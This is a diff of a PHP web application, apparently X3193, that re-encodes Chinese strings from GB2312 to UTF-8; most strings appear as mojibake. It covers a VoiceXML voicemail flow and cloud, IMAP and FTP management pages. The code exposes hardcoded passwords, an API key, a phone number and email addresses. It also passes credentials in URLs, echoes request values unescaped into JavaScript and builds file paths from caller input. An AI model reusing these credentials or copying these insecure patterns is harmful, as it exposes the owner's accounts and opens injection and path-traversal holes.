-        $str = str_replace("£¬",",",$str);       
-        $str = str_replace("¡£",".",$str);       
-        $str = str_replace("£¡","!",$str);       
-        $str = str_replace("£¿","?",$str);       
-        $str = str_replace("£º",":",$str);       
-        $str = str_replace("£»",";",$str);       
-        $str = str_replace("¡ª¡ª","-",$str);       
-        $str = str_replace("£¨","(",$str);       
-        $str = str_replace("£©",")",$str);       
-        $str = str_replace("¡°","\"",$str);       
-        $str = str_replace("¡±","\"",$str);       
-        $str = str_replace("¡¶","<",$str);       
-        $str = str_replace("¡·",">",$str);       
-        $str = str_replace("¡®","\'",$str);       
-        $str = str_replace("¡¯","\'",$str);       
-        $str = str_replace("¡­¡­","...",$str);       
-        $str = str_replace("£¤","$",$str);  
+        $str = str_replace("ï¼Œ",",",$str);       
+        $str = str_replace("ã€‚",".",$str);       
+        $str = str_replace("ï¼","!",$str);       
+        $str = str_replace("ï¼Ÿ","?",$str);       
+        $str = str_replace("ï¼š",":",$str);       
+        $str = str_replace("ï¼›",";",$str);       
+        $str = str_replace("â€”â€”","-",$str);       
+        $str = str_replace("ï¼ˆ","(",$str);       
+        $str = str_replace("ï¼‰",")",$str);       
+        $str = str_replace("â€œ","\"",$str);       
+        $str = str_replace("â€","\"",$str);       
+        $str = str_replace("ã€Š","<",$str);       
+        $str = str_replace("ã€‹",">",$str);       
+        $str = str_replace("â€˜","\'",$str);       
+        $str = str_replace("â€™","\'",$str);       
+        $str = str_replace("â€¦â€¦","...",$str);       
+        $str = str_replace("ï¿¥","$",$str);  
         return $str;
 }
 
@@ -4563,45 +6191,45 @@ echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
 <vxml version="2.1" xmlns="http://www.w3.org/2001/vxml">
    <form id="record">
    <record name="msg" beep="true" maxtime="1800s" finalsilence="4000ms" type="audio/x-wav" dtmfterm="true">
-        <prompt timeout="5s" xml:lang="zh-cn"><?php  echo formatchar("ÇëÁôÑÔ£¡","utf-8");?></prompt>
+        <prompt timeout="5s" xml:lang="zh-cn"><?php  echo ("è¯·ç•™è¨€ï¼");?></prompt>
         <catch event="nomatch noinput help">
                 <reprompt />
         </catch>        
    </record>
    <block>
-        <prompt xml:lang="zh-cn"><?php  echo formatchar("ÄúµÄÁôÑÔÊÇ£º","utf-8");?><value expr="msg"/></prompt>
-        <prompt xml:lang="zh-cn"><?php  echo formatchar("ÁôÑÔ³É¹¦£¡","utf-8");?></prompt>
+        <prompt xml:lang="zh-cn"><?php  echo ("æ‚¨çš„ç•™è¨€æ˜¯ï¼š");?><value expr="msg"/></prompt>
+        <prompt xml:lang="zh-cn"><?php  echo ("ç•™è¨€æˆåŠŸï¼");?></prompt>
    </block>
    <var name="callerid" expr="session.callerid"/>
    <var name="calledid" expr="session.telephone.dnis"/>
    <var name="uid" expr="<?php echo time();?>"/>
-   <subdialog fetchtimeout="1200s" name="oResult" src="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=message&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" namelist="msg callerid calledid uid" method="post">
+   <subdialog fetchtimeout="1200s" name="oResult" src="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=message&amp;botapikey=vnjk4673fvhn578g" namelist="msg callerid calledid uid" method="post">
         <filled>
                 <if cond="oResult.code=='1'">
-                        <prompt xml:lang="zh-cn"><value expr="oResult.info"/><?php  echo formatchar("Ğ»Ğ»£¡","utf-8");?></prompt>
+                        <prompt xml:lang="zh-cn"><value expr="oResult.info"/><?php  echo ("è°¢è°¢ï¼");?></prompt>
                 <else/>
-                        <prompt xml:lang="zh-cn"><?php  echo formatchar("¶Ô²»Æğ£¡","utf-8");?></prompt><prompt xml:lang="zh-cn"><?php  echo formatchar("ÇëÖØĞÂÁôÑÔ£¡","utf-8");?></prompt>
-                        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585"/>
+                        <prompt xml:lang="zh-cn"><?php  echo ("å¯¹ä¸èµ·ï¼");?></prompt><prompt xml:lang="zh-cn"><?php  echo ("è¯·é‡æ–°ç•™è¨€ï¼");?></prompt>
+                        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578g"/>
         </if>
     </filled>
    </subdialog>
    <block>
-        <prompt xml:lang="zh-cn"><?php  echo formatchar("ÄúµÄÁôÑÔÊÇ£¡","utf-8");?></prompt>
+        <prompt xml:lang="zh-cn"><?php  echo ("æ‚¨çš„ç•™è¨€æ˜¯ï¼");?></prompt>
         <audio expr="'./record/' + callerid + '->' + calledid + '-' + uid + '.wav'"></audio>
         <goto next="#backmenu"/>
    </block>
   </form>
   <form id="backmenu">
         <field name="inputitem">
-           <prompt xml:lang="zh-cn"><break time="500ms"/><?php  echo formatchar("·µ»ØÊ×Ò³Çë°´ĞÇºÅ¼ü£¬·µ»ØÉÏÒ³Çë°´¾®ºÅ¼ü£¡","utf-8");?></prompt>
+           <prompt xml:lang="zh-cn"><break time="500ms"/><?php  echo ("è¿”å›é¦–é¡µè¯·æŒ‰æ˜Ÿå·é”®ï¼Œè¿”å›ä¸Šé¡µè¯·æŒ‰äº•å·é”®ï¼");?></prompt>
       <catch event="nomatch noinput help">
                         <reprompt />
                 </catch>
       <grammar mode="voice" root="item1">
        <rule id="item1">
         <one-of>
-         <item><?php  echo formatchar("Ê×Ò³","utf-8");?></item>
-         <item><?php  echo formatchar("ÉÏÒ³","utf-8");?></item>
+         <item><?php  echo ("é¦–é¡µ");?></item>
+         <item><?php  echo ("ä¸Šé¡µ");?></item>
         </one-of>
        </rule>
       </grammar>
@@ -4615,9 +6243,9 @@ echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
      </grammar>
      <filled>
         <if cond="inputitem == '*'">
-        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=main&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
+        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=main&amp;botapikey=vnjk4673fvhn578g" />
        <elseif cond="inputitem == '#'"/>
-        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
+        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578g" />
        <else/>
         <prompt><break time="500ms" /></prompt>
       </if>
@@ -4628,34 +6256,34 @@ echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
 <?php 
                                 break;                        
                       	case "message": 
-																$info = "'".formatchar("ÓïÒô·µ»ØĞÅÏ¢","utf-8")."'";
+																$info = "'".("è¯­éŸ³è¿”å›ä¿¡æ¯")."'";
 																$code = 1;
                                 if (is_uploaded_file($_FILES['msg']['tmp_name'])){
    					 										//$twilio = new twilio_class();
-             										//$twilio->twiliosendsms('json','+8615998963077',trim('ÄúÓĞÒ»¸öĞÂµÄÓïÒôÁôÑÔ£¬À´×Ô£º'.trim(request("callerid")).'À´Ô´£º'.trim(request("calledid"))),trim('X3193ÓïÒôÁôÑÔ'));
+             										//$twilio->twiliosendsms('json','+8615998963077',trim('æ‚¨æœ‰ä¸€ä¸ªæ–°çš„è¯­éŸ³ç•™è¨€ï¼Œæ¥è‡ªï¼š'.trim(request("callerid")).'æ¥æºï¼š'.trim(request("calledid"))),trim('X3193è¯­éŸ³ç•™è¨€'));
 				      									$voxeo = new voxeo_class();
-                  							$voxeo->voxeosendsms('x3193','EUIfgwe7','+8615998963077',trim('ÄúÓĞÒ»¸öĞÂµÄÓïÒôÁôÑÔ£¬À´×Ô£º'.trim(request("callerid")).'À´Ô´£º'.trim(request("calledid"))));        
+                  							$voxeo->voxeosendsms('x3193','EUIfgwe7','+8615998963077',trim('æ‚¨æœ‰ä¸€ä¸ªæ–°çš„è¯­éŸ³ç•™è¨€ï¼Œæ¥è‡ªï¼š'.trim(request("callerid")).'æ¥æºï¼š'.trim(request("calledid"))));        
                                 	                                                                               	
                                 if (copy($_FILES['msg']['tmp_name'], "./record/".trim(request("callerid"))."->".trim(request("calledid"))."-".trim(request("uid")).".wav")){
                  													$vdisk = new vdisk_class();
 																					if($vdisk->vdiskupload("xcy6272003@126.com", "EUIfgwe7","./record/".trim(request("callerid"))."->".trim(request("calledid"))."-".trim(request("uid")).".wav","0")){ 
                                 								$code = 1;
-																								$info = "'".formatchar("ÓïÒôÎÄ¼ş´æ´¢ÓëÍøÂç±¸·İ³É¹¦","utf-8")."'";																						
+																								$info = "'".("è¯­éŸ³æ–‡ä»¶å­˜å‚¨ä¸ç½‘ç»œå¤‡ä»½æˆåŠŸ")."'";																						
 																					}
 																					else{
 											                          $code = 0;
-																								$info = "'".formatchar("ÓïÒôÎÄ¼ş´æ´¢ÓëÍøÂç±¸·İÊ§°Ü","utf-8")."'";											                          											                          
+																								$info = "'".("è¯­éŸ³æ–‡ä»¶å­˜å‚¨ä¸ç½‘ç»œå¤‡ä»½å¤±è´¥")."'";											                          											                          
 																					}
                                 }
                                 else{
                                 								$code = 0;
-																								$info = "'".formatchar("ÎŞ·¨±£´æ","utf-8")."'";	                                								
+																								$info = "'".("æ— æ³•ä¿å­˜")."'";	                                								
                                 }
                                       
                                 } 
                                 else{                         	
                                         $code = 0;
-																				$info = "'".formatchar("ÉÏ´«Ê§°Ü","utf-8")."'";	                                        
+																				$info = "'".("ä¸Šä¼ å¤±è´¥")."'";	                                        
                                 }                               
 
                                 echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
@@ -4679,7 +6307,7 @@ echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
   <form id="topmenu">
         <field name="inputitem">
       <prompt xml:lang="zh-CN" >
-        <break time="5s" /><?php  echo formatchar("ÄúºÃ£¡ÁôÑÔÇë°´Ò»£»ÓïÒôÊ¶±ğÇë°´¶ş","utf-8");?><break time="500ms" />
+        <break time="5s" /><?php  echo ("æ‚¨å¥½ï¼ç•™è¨€è¯·æŒ‰ä¸€ï¼›è¯­éŸ³è¯†åˆ«è¯·æŒ‰äºŒ");?><break time="500ms" />
       </prompt>
       <catch event="nomatch noinput help">
                         <reprompt />
@@ -4702,9 +6330,9 @@ echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
      </grammar>
      <filled>
        <if cond="inputitem == '1'">
-        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
+        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578g" />
        <elseif cond="inputitem == '2'"/>
-        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
+        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=record&amp;botapikey=vnjk4673fvhn578g" />
        <else/>
         <prompt><break time="500ms" /></prompt>
       </if>
@@ -4714,7 +6342,7 @@ echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
         <form id="goodbye">
                 <block>
                         <prompt><break time="5s" /></prompt>
-                        <prompt xml:lang="zh-CN" ><?php  echo formatchar("ÔÙ¼û £¡","utf-8");?>	</prompt>
+                        <prompt xml:lang="zh-CN" ><?php  echo ("å†è§ ï¼");?>	</prompt>
                         <disconnect/>
                 </block>        
         </form>           
@@ -4726,12 +6354,12 @@ echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
                                 $code =  $voxeo->voxeoverifycallid(trim(request('callerid')));
                                 if ($code !== '1'){
    					 											//$twilio = new twilio_class();
-             											//$twilio->twiliosendsms('json','+8615998963077',trim('ÄúÓĞÒ»¸öĞÂµÄÓïÒô·ÃÎÊµã£¬À´×Ô£º'.trim(request("callerid")).'À´Ô´£º'.trim(request("calledid"))),trim('X3193ÓïÒôÁôÑÔ'),trim('X3193ÓïÒôÁôÑÔÄ£¿é'));
+             											//$twilio->twiliosendsms('json','+8615998963077',trim('æ‚¨æœ‰ä¸€ä¸ªæ–°çš„è¯­éŸ³è®¿é—®ç‚¹ï¼Œæ¥è‡ªï¼š'.trim(request("callerid")).'æ¥æºï¼š'.trim(request("calledid"))),trim('X3193è¯­éŸ³ç•™è¨€'),trim('X3193è¯­éŸ³ç•™è¨€æ¨¡å—'));
 				      										$voxeo = new voxeo_class();
-                  								$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077',trim('ÄúÓĞÒ»¸öĞÂµÄÓïÒô·ÃÎÊµã£¬À´×Ô£º'.trim(request("callerid")).'À´Ô´£º'.trim(request("calledid"))),trim('X3193ÓïÒôÁôÑÔ'));        
+                  								$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077',trim('æ‚¨æœ‰ä¸€ä¸ªæ–°çš„è¯­éŸ³è®¿é—®ç‚¹ï¼Œæ¥è‡ªï¼š'.trim(request("callerid")).'æ¥æºï¼š'.trim(request("calledid"))),trim('X3193è¯­éŸ³ç•™è¨€'));        
 
               							    	$html = new mail_class();
-							                  	$html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193ÓĞÒ»¸öĞÂµÄÓïÒô·ÃÎÊµã', trim('ÄúÓĞÒ»¸öĞÂµÄÓïÒô·ÃÎÊµã£¬À´×Ô£º'.trim(request("callerid")).'À´Ô´£º'.trim(request("calledid"))),trim('X3193ÓïÒôÁôÑÔ'),trim('X3193ÓïÒôÁôÑÔÄ£¿é'),'gb2312');
+							                  	$html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193æœ‰ä¸€ä¸ªæ–°çš„è¯­éŸ³è®¿é—®ç‚¹', trim('æ‚¨æœ‰ä¸€ä¸ªæ–°çš„è¯­éŸ³è®¿é—®ç‚¹ï¼Œæ¥è‡ªï¼š'.trim(request("callerid")).'æ¥æºï¼š'.trim(request("calledid"))),trim('X3193è¯­éŸ³ç•™è¨€'),trim('X3193è¯­éŸ³ç•™è¨€æ¨¡å—'),'gb2312');
 																}
 		
                                 echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
@@ -4753,13 +6381,13 @@ echo '<'.'?'.'xml version="1.0" encoding="UTF-8"?>';
    <var name="callerid" expr="session.callerid"/>
    <var name="calledid" expr="session.telephone.dnis"/>
    <var name="uid" expr="<?php echo time();?>"/>
-   <subdialog name="oResult" src="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=phonelimiter&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" namelist="callerid calledid uid" method="post">
+   <subdialog name="oResult" src="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=phonelimiter&amp;botapikey=vnjk4673fvhn578g" namelist="callerid calledid uid" method="post">
       <filled>
             <if cond="oResult.code=='1'">
-                        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=main&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
+                        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=main&amp;botapikey=vnjk4673fvhn578g" />
             <else/>
             					<prompt xml:lang="zh-CN" >
-        								<break time="2s" /><?php  echo formatchar("ÄúºÃ£¡ÄúÔİÊ±ÎŞ·¨½øÈë¸ÃÕ¾µã£¡Ğ»Ğ»£¡","utf-8");?><break time="500ms" />
+        								<break time="2s" /><?php  echo ("æ‚¨å¥½ï¼æ‚¨æš‚æ—¶æ— æ³•è¿›å…¥è¯¥ç«™ç‚¹ï¼è°¢è°¢ï¼");?><break time="500ms" />
       								</prompt>
                       <disconnect/>
             </if>
@@ -4820,7 +6448,7 @@ exit;
 
 <?php 
 function openshift() {
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 ?>
 <head>
@@ -4829,7 +6457,7 @@ $style = new css();
 $style->ico();
 $style->title("X3193 - IMAP");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -4843,9 +6471,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -4859,7 +6487,7 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
 </table>
 <?php 
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('pagesize')) == "")
         $pagesize = 30;
 elseif (trim(request('pagesize')) > 50)
@@ -4891,7 +6519,7 @@ switch (trim(request('action'))) {  // case start
                         If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                 if (trim(request("checkcode")) != ""){
                                 			if(!is_wap()){
-                                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                         break;
                                       }  
                                       else{
@@ -4899,13 +6527,13 @@ switch (trim(request('action'))) {  // case start
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result">
-											ËÄÎ»ÑéÖ¤Âë´íÎó£¡
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>·µ»Ø</a>
+											å››ä½éªŒè¯ç é”™è¯¯ï¼
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>è¿”å›</a>
                 </td>
         </tr>  
 </table> 
@@ -4914,7 +6542,7 @@ switch (trim(request('action'))) {  // case start
                                     }
                                 }       
                                 elseif (trim(request("checkcode")) == ""){
-                                        AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                         break;
                                 }               
                         }
@@ -4974,7 +6602,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                 if (is_array($domain)) {
                 }       
                 else {
-                        AlertBack("ÓòÃûÁĞ±íÊä³öÊ§°Ü£¡" , 2);
+                        AlertBack("åŸŸååˆ—è¡¨è¾“å‡ºå¤±è´¥ï¼" , 2);
                         break;
                 }
                 //return;
@@ -4993,21 +6621,21 @@ function selitemall()
 }
 function delitem()
 {
- if(!confirm('È·¶¨É¾³ıÑ¡ÖĞµÄÎÄ¼şÂğ?')) return;
+ if(!confirm('ç¡®å®šåˆ é™¤é€‰ä¸­çš„æ–‡ä»¶å—?')) return;
  document.openshift.action='<?php echo httppath()."?api=openshift&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
  document.openshift.submit();
 }
 
 function rename(oldName)
 {
-toname=prompt('½«ÎÄ¼ş '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†æ–‡ä»¶ '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=openshift&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
 
 function renamed(oldName)
 {
-toname=prompt('½«Ä¿Â¼ '+oldName+' ¸ÄÃûÎª:',oldName);
+toname=prompt('å°†ç›®å½• '+oldName+' æ”¹åä¸º:',oldName);
 if(!toname)return;
 window.location='<?php echo httppath()."?api=openshift&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
 }
@@ -5018,7 +6646,7 @@ function encodeuri(str){
         newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
         newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
         newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
-        // js replace µÄÄ£Ê½ÎŞÒıºÅ£¨Ë«µ¥£©£¬ÌØÊâ×Ö·ûĞè¼ÓĞ±¸Ü£¬¿ÉÒÔµ¥¶ÀÌæ»»Ä³¸ö×Ö·û¡£
+        // js replace çš„æ¨¡å¼æ— å¼•å·ï¼ˆåŒå•ï¼‰ï¼Œç‰¹æ®Šå­—ç¬¦éœ€åŠ æ–œæ ï¼Œå¯ä»¥å•ç‹¬æ›¿æ¢æŸä¸ªå­—ç¬¦ã€‚
         return(newstr);
 }
 </script>       
@@ -5042,7 +6670,7 @@ function encodeuri(str){
                 //echo $endid;          
                 ?>
         <tr class="tdtbg">
-                <td align="left">&nbsp;ÔÆ¿Õ¼ä¹ÜÀí -> <a href="<?php echo ScriptPath()."?api=openshift&action=".encodeuri("domain.list")."&uname=".encodeuri(trim(base64_Decode($_SESSION["openshift"]["uname"])))."&pwd=".encodeuri(trim(base64_Decode($_SESSION["openshift"]["pwd"])))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(base64_decode($_SESSION["openshift"]["uname"]))?></a> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=openshift&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("pwd"))))."&botkey=".encodeuri(trim($botkey))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1"?>" target="_self">ÍË³ö</a></td>
+                <td align="left">&nbsp;äº‘ç©ºé—´ç®¡ç† -> <a href="<?php echo ScriptPath()."?api=openshift&action=".encodeuri("domain.list")."&uname=".encodeuri(trim(base64_Decode($_SESSION["openshift"]["uname"])))."&pwd=".encodeuri(trim(base64_Decode($_SESSION["openshift"]["pwd"])))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(base64_decode($_SESSION["openshift"]["uname"]))?></a> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=openshift&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("pwd"))))."&botkey=".encodeuri(trim($botkey))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1"?>" target="_self">é€€å‡º</a></td>
         </tr>
 </table>
                 <?php 
@@ -5056,9 +6684,9 @@ function encodeuri(str){
                 ?>
                         <tr class="tdbg">
                                 <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
-                                <td align="center" width="25%">ÎÄ¼ş¼Ğ</td>
-                                <td align="center">ÈİÁ¿ - ×îĞÂ - Î´¶Á</td>
-                                <td align="center" width="30%">ËÑË÷ ´´½¨ É¾³ı</td>
+                                <td align="center" width="25%">æ–‡ä»¶å¤¹</td>
+                                <td align="center">å®¹é‡ - æœ€æ–° - æœªè¯»</td>
+                                <td align="center" width="30%">æœç´¢ åˆ›å»º åˆ é™¤</td>
                         </tr>
                 <?php 
                 for($i = $strpagesize*($page-1);$i <= $endid;$i++){
@@ -5067,7 +6695,7 @@ function encodeuri(str){
                                 <td align="center"><input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" /></td>
                                 <td align="center"><?php echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=&skin=".$skincolor."'>"."*-".$contents['data'][$i]['userid'].".".$contents['data'][$i]['maindomain']."</a>";?></td>
                                 <td align="center"><?php echo (($status->messages=="")?"0":$status->messages).' - '.(($status->recent=="")?"0":$status->recent).' - '.(($status->unseen=="")?"0":$status->unseen);?></td>
-                                <td align="center">ËÑË÷ Ìí¼Ó É¾³ı Åä¶î ¸üÃû</td>
+                                <td align="center">æœç´¢ æ·»åŠ  åˆ é™¤ é…é¢ æ›´å</td>
                         </tr>
                         <?php 
                 }
@@ -5078,13 +6706,13 @@ function encodeuri(str){
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdbg">
-                <td align="center" colspan="3"> ¹² <?php  echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3"> å…± <?php  echo $totalpage;?> é¡µ ç¬¬  
                 <?php 
-                echo $page." Ò³ ".$sCrLf;
+                echo $page." é¡µ ".$sCrLf;
                 if (floor($page)>1)
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>ÉÏÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>ä¸Šä¸€é¡µ</a> ";
                 if (floor($page)>0 && floor($page)<floor($totalpage))
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>ÏÂÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>ä¸‹ä¸€é¡µ</a> ";
 
                 $gotopage = New PageChange();
                 $gotopage->CallPageChange();
@@ -5093,7 +6721,7 @@ function encodeuri(str){
         </tr>   
 </table>
 <?php 
-                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
